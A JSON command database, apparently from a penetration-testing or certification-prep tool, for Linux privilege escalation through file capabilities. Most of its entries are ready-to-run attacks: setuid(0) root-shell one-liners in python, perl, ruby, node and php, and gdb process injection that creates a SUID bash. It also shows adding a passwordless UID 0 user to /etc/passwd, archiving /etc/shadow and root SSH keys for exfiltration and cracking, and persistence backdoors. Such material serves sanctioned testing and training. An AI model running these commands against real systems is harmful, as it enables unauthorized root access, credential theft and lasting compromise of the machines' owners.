{
  "commands": [
    {
      "id": "enumerate-capabilities",
      "name": "Enumerate Linux File Capabilities",
      "category": "post-exploit",
      "subcategory": "privilege-escalation",
      "command": "getcap -r / 2>/dev/null",
      "description": "Recursively enumerate all binaries with Linux file capabilities set. Capabilities are kernel features that grant specific elevated permissions without requiring full SUID root. This discovers potential privilege escalation vectors by locating binaries with dangerous capabilities like cap_setuid or cap_dac_override.",
      "tags": [
        "LINUX",
        "CAPABILITIES",
        "PRIVILEGE_ESCALATION",
        "ENUMERATION",
        "FILE_PERMISSIONS"
      ],
      "variables": [],
      "flag_explanations": {
        "-r": "Recursive: Search through directories recursively from the specified path (/ for entire filesystem). Required to enumerate all binaries system-wide.",
        "/": "Starting path: Begin search from root directory to cover entire filesystem. Can be changed to specific directory (e.g., /usr/bin) for faster targeted search.",
        "2>/dev/null": "Error suppression: Redirect stderr (file descriptor 2) to /dev/null to hide 'Permission denied' errors from inaccessible directories. Makes output cleaner and easier to parse."
      },
      "success_indicators": [
        "Binary paths with capability notation (e.g., /usr/bin/python3.8 = cap_setuid+ep)",
        "Capabilities shown in format: cap_name+ep or cap_name=eip",
        "At least one binary with capabilities found",
        "Output contains recognizable capability names (cap_setuid, cap_dac_override, etc.)"
      ],
      "failure_indicators": [
        "No output (no capabilities found on system)",
        "Command not found (getcap not installed)",
        "Only permission denied errors (insufficient read access)",
        "getcap: error while loading shared libraries"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "getcap: command not found": "Install libcap: apt-get install libcap2-bin (Debian/Ubuntu) or yum install libcap (RedHat/CentOS)",
        "No output returned": "System may not have any capabilities set. This is common on minimal installations. Try checking /usr/bin and /usr/sbin specifically.",
        "Permission denied for all paths": "Run from directories with read access, or focus on /usr/bin, /usr/local/bin where capabilities are commonly set",
        "Output format unclear": "Capabilities shown as cap_name+ep mean: +e (effective), +p (permitted). Both together indicate capability is active."
      },
      "notes": "Capabilities notation:\n+ep means Effective and Permitted (capability is active).\n\n=eip means Effective, Inheritable, and Permitted (full capability inheritance).\n\nComma-separated capabilities possible:\ncap_net_admin,cap_net_raw+ep.\n\nNetwork capabilities (cap_net_raw, cap_net_admin) are non-exploitable for privesc.\n\nEmpty output is normal on hardened systems without capability-based binaries.\n\nFaster than full SUID enumeration as fewer binaries typically have capabilities.",
      "methodology_guidance": {
        "after_success": "Analyze output for dangerous capabilities: cap_setuid, cap_dac_override, cap_dac_read_search, cap_sys_admin, cap_sys_ptrace Cross-reference binaries with GTFOBins capabilities section Focus on interpreters (python, perl, ruby, php) and editors (vim, nano) with capabilities Research exploitation techniques for identified capability/binary combinations"
      }
    },
    {
      "id": "filter-exploitable-caps",
      "name": "Filter Exploitable Capabilities",
      "category": "post-exploit",
      "subcategory": "privilege-escalation",
      "command": "# Manual analysis - filter getcap output for dangerous capabilities\n# CRITICAL: cap_setuid, cap_dac_override, cap_sys_admin, cap_sys_ptrace\n# HIGH: cap_dac_read_search, cap_setgid, cap_chown, cap_fowner\n# NON-EXPLOITABLE: cap_net_raw, cap_net_admin (network only)",
      "description": "Analyze getcap enumeration output to identify dangerous capabilities that enable privilege escalation. Focus on critical capabilities: cap_setuid (spawn root shell), cap_dac_override (bypass file permissions for write), cap_dac_read_search (bypass read permissions), cap_sys_admin (mount filesystems), cap_sys_ptrace (inject code). Ignore network-only capabilities.",
      "tags": [
        "LINUX",
        "CAPABILITIES",
        "PRIVILEGE_ESCALATION",
        "ANALYSIS",
        "FILTERING"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "At least one critical or high severity capability identified",
        "Capability is documented in GTFOBins or HackTricks",
        "Binary is standard utility (python, vim, tar, etc.) with known exploitation",
        "Clear exploitation path available"
      ],
      "failure_indicators": [
        "Only network capabilities found (cap_net_raw, cap_net_admin)",
        "Capabilities on obscure binaries with no documented exploitation",
        "All binaries are network utilities (dumpcap, nmap, fping) - non-exploitable",
        "Capabilities without effective bit set (+p only, not +ep)"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "Only network capabilities found": "System may be hardened. Check SUID binaries instead: find / -perm -4000 2>/dev/null",
        "Unclear which capabilities are exploitable": "Consult GTFOBins capabilities filter: https://gtfobins.github.io/#+capabilities",
        "Binary not in GTFOBins": "Research capability function in man 7 capabilities. cap_setuid and cap_dac_override are almost always exploitable."
      },
      "notes": "CRITICAL CAPABILITIES - Direct root access:\n\ncap_setuid:\nChange process UID to 0 (root shell).\n\ncap_dac_override:\nBypass all file permission checks (write any file).\n\ncap_sys_admin:\nFull system administration (mount, namespace manipulation).\n\ncap_sys_ptrace:\nTrace any process (inject shellcode into root process).\n\nHIGH SEVERITY CAPABILITIES - Sensitive data access:\n\ncap_dac_read_search:\nBypass read permission checks (shadow, SSH keys).\n\ncap_setgid:\nChange GID to root group.\n\ncap_chown:\nChange file ownership (chown /etc/passwd to gain write).\n\ncap_fowner:\nBypass permission checks for file operations.\n\nNON-EXPLOITABLE FOR PRIVESC:\n\ncap_net_raw, cap_net_admin:\nNetwork packet manipulation only.\n\ncap_net_bind_service:\nBind to privileged ports <1024.",
      "methodology_guidance": {
        "after_success": "For cap_setuid: Check if binary is interpreter (python, perl, ruby, node) - instant root shell For cap_dac_override: Check if binary is editor (vim, nano) - edit /etc/passwd for UID 0 For cap_dac_read_search: Check if binary can read files (tar, base64) - exfiltrate shadow/keys Cross-reference binary against GTFOBins capabilities section for exact technique"
      }
    },
    {
      "id": "gtfobins-cap-lookup",
      "name": "GTFOBins Capabilities Lookup",
      "category": "post-exploit",
      "subcategory": "privilege-escalation",
      "command": "# Manual lookup process:\n# 1. Visit https://gtfobins.github.io/\n# 2. Use filter: Click 'Capabilities' checkbox\n# 3. Search for binary name (python, vim, tar, etc.)\n# 4. Note exact command syntax with capability requirements\n# Alternative: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities",
      "description": "Research documented exploitation techniques for identified capability/binary combinations using GTFOBins or HackTricks. GTFOBins provides exact command syntax for exploiting capabilities on common Unix binaries. Each capability type requires different exploitation approach based on what privileged operation it enables.",
      "tags": [
        "LINUX",
        "CAPABILITIES",
        "GTFOBINS",
        "RESEARCH",
        "PRIVILEGE_ESCALATION"
      ],
      "variables": [],
      "flag_explanations": {},
      "success_indicators": [
        "Exact exploitation command found for binary/capability combination",
        "Command syntax includes variable substitution",
        "Success indicators clearly documented",
        "Alternative techniques available if primary fails"
      ],
      "failure_indicators": [
        "Binary not documented in GTFOBins capabilities section",
        "Capability type not exploitable with this binary",
        "Technique requires additional dependencies not available",
        "Command syntax incomplete or unclear"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "Binary not in GTFOBins": "Check if binary is symlink to documented binary (python3.8 -> python). Try HackTricks for more comprehensive coverage.",
        "Multiple techniques available": "Start with simplest technique (usually first listed). For cap_setuid on python: os.setuid(0) approach is most reliable.",
        "Technique syntax unclear": "Read GTFOBins 'Description' section for context. Look for similar binaries (python2 vs python3 techniques often identical)."
      },
      "notes": "COMMON GTFOBINS CAPABILITY EXPLOITS:\n\ncap_setuid exploitation:\n\n- python/perl/ruby:\nUse setuid(0) syscall then spawn shell.\n\n- php:\nposix_setuid(0) then system('/bin/bash').\n\n- node:\nprocess.setuid(0) then require('child_process').spawn('/bin/bash').\n\ncap_dac_override exploitation:\n\n- vim/nano:\nOpen /etc/passwd, add user with UID 0.\n\n- tar:\nCreate archive with modified /etc/passwd, extract to overwrite.\n\n- cp:\nCopy /etc/passwd to /tmp, modify, copy back.\n\ncap_dac_read_search exploitation:\n\n- tar:\nArchive sensitive files (shadow, SSH keys) for exfiltration.\n\n- base64:\nEncode and exfiltrate /etc/shadow or root SSH keys.\n\n- od/xxd:\nDump binary files like /etc/shadow.\n\ncap_sys_ptrace exploitation:\n\n- gdb:\nAttach to root process, inject shellcode.\n\n- strace:\nTrace root process, potentially inject.\n\ncap_sys_admin exploitation:\n\n- mount:\nMount privileged filesystem or overlay /etc.\n\nGTFOBins capabilities filter is most reliable source for exact syntax.",
      "methodology_guidance": {
        "after_success": "Copy exact command syntax from GTFOBins Substitute <CAP_BINARY> with actual binary path from getcap Test command in controlled manner to verify syntax Document expected output and success criteria"
      }
    },
    {
      "id": "execute-cap-exploit",
      "name": "Execute Capability Exploitation",
      "category": "post-exploit",
      "subcategory": "privilege-escalation",
      "command": "# Command depends on capability type and binary:\n# TEMPLATE: <CAP_BINARY> [capability-specific-arguments]\n# See specific commands below for each capability type",
      "description": "Execute capability exploitation using documented GTFOBins technique. Each capability/binary combination requires different command syntax. This is the actual privilege escalation step where the capability is abused to perform privileged operations like spawning root shell, editing sensitive files, or reading protected data.",
      "tags": [
        "LINUX",
        "CAPABILITIES",
        "PRIVILEGE_ESCALATION",
        "EXPLOITATION",
        "GTFOBINS"
      ],
      "variables": [
        {
          "name": "<CAP_BINARY>",
          "description": "Full path to binary with capabilities",
          "required": true,
          "example": "/usr/bin/python3.8"
        }
      ],
      "flag_explanations": {},
      "success_indicators": [
        "For cap_setuid: Root shell spawned (# prompt, uid=0 in whoami)",
        "For cap_dac_override: Successfully edited /etc/passwd or other root file",
        "For cap_dac_read_search: Successfully read /etc/shadow or root SSH keys",
        "For cap_sys_ptrace: Successfully attached to root process with gdb",
        "No permission denied errors",
        "Privileged operation completed successfully"
      ],
      "failure_indicators": [
        "Permission denied errors despite capability",
        "Binary behavior differs from GTFOBins documentation",
        "Missing dependencies (libraries, interpreters)",
        "AppArmor or SELinux blocking capability abuse",
        "Capability not effective (+p only, missing +e)"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "Root shell doesn't spawn": "Check if shell spawned but without root prompt. Try: id and whoami to verify UID. May need interactive TTY upgrade.",
        "File edit fails despite cap_dac_override": "Verify capability has +e (effective) bit set. Check AppArmor/SELinux status: aa-status or getenforce",
        "Technique works but not root": "Some capabilities give partial access. cap_dac_read_search reads files but doesn't give root shell. Use to read shadow and crack passwords instead.",
        "Binary not executable": "Check if binary is actually executable (not just readable). Try: file <CAP_BINARY> to verify it's ELF binary."
      },
      "notes": "SPECIFIC EXPLOITATION COMMANDS BY CAPABILITY:\n\ncap_setuid + python/python3:\n/usr/bin/python3 -c 'import os;\nos.setuid(0);\nos.system(\"/bin/bash\")'\nResult:\nSpawns root shell immediately.\n\ncap_setuid + perl:\n/usr/bin/perl -e 'use POSIX qw(setuid);\nPOSIX::setuid(0);\nexec \"/bin/bash\";'\nResult:\nSpawns root shell.\n\ncap_setuid + ruby:\n/usr/bin/ruby -e 'Process::Sys.setuid(0);\nexec \"/bin/bash\"'\nResult:\nSpawns root shell.\n\ncap_setuid + node:\n/usr/bin/node -e 'process.setuid(0);\nrequire(\"child_process\").spawn(\"/bin/bash\", {stdio:\n[0, 1, 2]});'\nResult:\nSpawns root shell.\n\ncap_setuid + php:\n/usr/bin/php -r \"posix_setuid(0);\nsystem('/bin/bash');\"\nResult:\nSpawns root shell.\n\ncap_dac_override + vim:\n/usr/bin/vim.basic /etc/passwd\nThen:\nAdd line:\nhacker:x:0:0::/root:/bin/bash\nThen:\nsu hacker (no password)\nResult:\nRoot access via UID 0 user.\n\ncap_dac_override + nano:\n/usr/bin/nano /etc/passwd\nSame as vim - add UID 0 user.\n\ncap_dac_read_search + tar:\n/usr/bin/tar -czf /tmp/shadow.tar.gz /etc/shadow\n/usr/bin/tar -czf /tmp/ssh.tar.gz /root/.ssh/id_rsa\nResult:\nSensitive files archived for exfiltration.\n\ncap_dac_read_search + base64:\n/usr/bin/base64 /etc/shadow | base64 -d\n/usr/bin/base64 /root/.ssh/id_rsa\nResult:\nFile contents exfiltrated.\n\ncap_sys_ptrace + gdb:\nFind root process:\nps aux | grep root\n/usr/bin/gdb -p <root_pid>\nThen:\ncall (void)system(\"cp /bin/bash /tmp/rootbash;\nchmod +xs /tmp/rootbash\")\nResult:\nSUID root shell created.\n\ncap_sys_admin + mount:\nAdvanced - mount privileged filesystem or overlay /etc\nRequires deep understanding of mount namespaces.",
      "methodology_guidance": {
        "after_success": "Verify privileged access achieved with whoami and id For root shell: stabilize shell and collect flags/loot For file access: exfiltrate sensitive data (shadow, SSH keys) Document exact exploitation path for reporting",
        "on_failure": "If failed: try alternative technique or different capability/binary"
      },
      "filled_example": "# Command depends on capability type and binary:\n# TEMPLATE: /usr/bin/python3.8 [capability-specific-arguments]\n# See specific commands below for each capability type"
    },
    {
      "id": "verify-cap-access",
      "name": "Verify Elevated Access from Capability Exploitation",
      "category": "post-exploit",
      "subcategory": "privilege-escalation",
      "command": "whoami && id && cat /etc/shadow 2>/dev/null | head -n 3",
      "description": "Verify successful privilege escalation after capability exploitation. Test multiple indicators: effective UID via whoami, full UID/GID/groups via id, ability to read root-protected files like /etc/shadow. This confirms level of access achieved and whether full root or partial privilege escalation succeeded.",
      "tags": [
        "LINUX",
        "CAPABILITIES",
        "PRIVILEGE_ESCALATION",
        "VERIFICATION",
        "POST_EXPLOITATION"
      ],
      "variables": [],
      "flag_explanations": {
        "whoami": "Display effective username. Should show 'root' if UID 0 achieved. No flags needed.",
        "id": "Display user identity: UID, GID, and group memberships. Shows uid=0(root) if full root achieved. No flags needed.",
        "cat /etc/shadow": "Read shadow password file (requires root). Tests read access to root-protected files.",
        "2>/dev/null": "Suppress errors if shadow unreadable (indicates partial escalation only).",
        "| head -n 3": "Show first 3 lines only (root, daemon, bin users). Reduces output clutter while proving access."
      },
      "success_indicators": [
        "whoami returns 'root'",
        "id shows uid=0(root) gid=0(root)",
        "/etc/shadow contents displayed (hashed passwords visible)",
        "No permission denied errors",
        "Shell prompt shows # instead of $ (if in shell)",
        "Can execute privileged commands without sudo"
      ],
      "failure_indicators": [
        "whoami still shows original user",
        "id shows non-zero UID",
        "cat /etc/shadow returns permission denied",
        "Only partial access achieved (read but not execute)",
        "Capability exploitation did not escalate privileges"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "whoami shows root but can't read shadow": "May be in restricted environment. Try: cat /proc/self/status | grep Uid to see all UIDs (real, effective, saved).",
        "id shows uid=0 but prompt still shows $": "Effective UID is root but shell prompt not updated. This is normal. Verify with file access tests instead of prompt.",
        "Partial access only (can read but not write)": "Expected for cap_dac_read_search (read-only). Exfiltrate shadow file and crack passwords offline instead.",
        "Permission denied despite uid=0": "AppArmor or SELinux may be restricting root capabilities. Check: aa-status or getenforce"
      },
      "notes": "Different capabilities grant different levels of access:\n\ncap_setuid:\nFull root shell (uid=0, all access).\n\ncap_dac_override:\nFull root file access (read+write any file).\n\ncap_dac_read_search:\nRead-only root file access (shadow, SSH keys).\n\ncap_sys_ptrace:\nIndirect root via process injection.\n\nIf shadow file readable, priority actions:\n\n1.\nCopy full shadow file for offline password cracking.\n\n2.\nExtract root user hash:\ncat /etc/shadow | grep '^root:'\n\n3.\nUse john or hashcat to crack:\njohn --wordlist=rockyou.txt shadow.txt\n\n4.\nLook for users with empty password fields (:::: format).\n\nIf root SSH key accessible:\n\n1.\nCopy /root/.ssh/id_rsa to attacker machine.\n\n2.\nSet correct permissions:\nchmod 600 id_rsa.\n\n3.\nSSH as root:\nssh -i id_rsa root@target.\n\nFor certification:\nScreenshot evidence of uid=0 and shadow/flag file access.",
      "methodology_guidance": {
        "after_success": "If root achieved: Collect flags from /root directory If root achieved: Exfiltrate sensitive data (shadow for cracking, SSH keys) If root achieved: Establish persistence (add SSH key, create SUID backdoor) If partial access: Attempt different capability exploitation technique Document exact access level achieved for reporting",
        "on_failure": "If failed: Fall back to other privilege escalation vectors (SUID, kernel, sudo)"
      }
    },
    {
      "id": "cap-exploit-dac-override-passwd-edit",
      "name": "Exploit cap_dac_override by Editing /etc/passwd",
      "category": "post-exploit",
      "subcategory": "privilege-escalation",
      "command": "<CAP_BINARY> /etc/passwd",
      "description": "Exploit cap_dac_override capability to bypass file permissions and edit /etc/passwd. Add a new user with UID 0 (root) and no password, then switch to that user for root access. This technique works with text editors (vim, nano) that have cap_dac_override set. Alternative to spawning root shell directly.",
      "tags": [
        "LINUX",
        "CAPABILITIES",
        "CAP_DAC_OVERRIDE",
        "PRIVILEGE_ESCALATION",
        "PASSWD_EDIT"
      ],
      "variables": [
        {
          "name": "<CAP_BINARY>",
          "description": "Text editor with cap_dac_override (vim, nano, etc.)",
          "required": true,
          "example": "/usr/bin/vim.basic"
        }
      ],
      "flag_explanations": {
        "/etc/passwd": "User account database file. Contains usernames, UIDs, GIDs, home directories, and shells. Normally writable only by root, but cap_dac_override bypasses this protection."
      },
      "success_indicators": [
        "Editor opens /etc/passwd without permission denied",
        "Can modify file contents and save changes",
        "New user line added successfully",
        "su command to new user succeeds without password",
        "whoami shows root after switching users"
      ],
      "failure_indicators": [
        "Permission denied when opening /etc/passwd",
        "Editor opens in read-only mode",
        "Cannot save changes to file",
        "AppArmor or SELinux blocks write",
        "File write succeeds but system ignores new user"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "File opens read-only": "Check capability has +e (effective) bit: getcap <CAP_BINARY>. Need +ep not just +p",
        "Cannot save changes": "Try alternative editor if available. Check disk space: df -h. Verify filesystem not read-only: mount | grep '/'",
        "New user not recognized": "Check /etc/passwd syntax. Format: username:x:UID:GID:comment:home:shell. Ensure UID is 0 for root.",
        "su hacker asks for password": "Check /etc/shadow - may have password set. Edit passwd line to: hacker::0:0::/root:/bin/bash (empty password field)."
      },
      "notes": "/etc/passwd line format:\nusername:x:UID:GID:GECOS:homedir:shell\n\nFor instant root:\nhacker:x:0:0::/root:/bin/bash\n\nusername:\nhacker (or any name).\n\nx:\nplaceholder (actual password in /etc/shadow).\n\nUID:\n0 (root user ID - critical).\n\nGID:\n0 (root group ID).\n\nGECOS:\nempty (full name field).\n\nhomedir:\n/root (root's home).\n\nshell:\n/bin/bash (login shell).\n\nAfter adding line, use:\nsu hacker (no password required).\n\nAlternative:\nRemove root password entirely:\n\nChange:\nroot:x:0:0:root:/root:/bin/bash\n\nTo:\nroot::0:0:root:/root:/bin/bash\n\nThen:\nsu root (no password).\n\ncap_dac_override bypasses Discretionary Access Control (DAC).\n\nDAC = traditional Unix file permissions (owner, group, other).\n\nDoes NOT bypass Mandatory Access Control (MAC) like SELinux/AppArmor.\n\nEditors other than vim/nano may work:\nemacs, ed, sed with -i flag.\n\nMore stealthy than spawning root shell (less obvious in process list).",
      "methodology_guidance": {
        "after_success": "Add line to /etc/passwd: hacker:x:0:0::/root:/bin/bash Save and exit editor (:wq in vim, Ctrl+O then Ctrl+X in nano) Switch to new user: su hacker Verify root access: whoami (should show root) Collect flags and establish persistence"
      },
      "filled_example": "/usr/bin/vim.basic /etc/passwd"
    }
  ]
}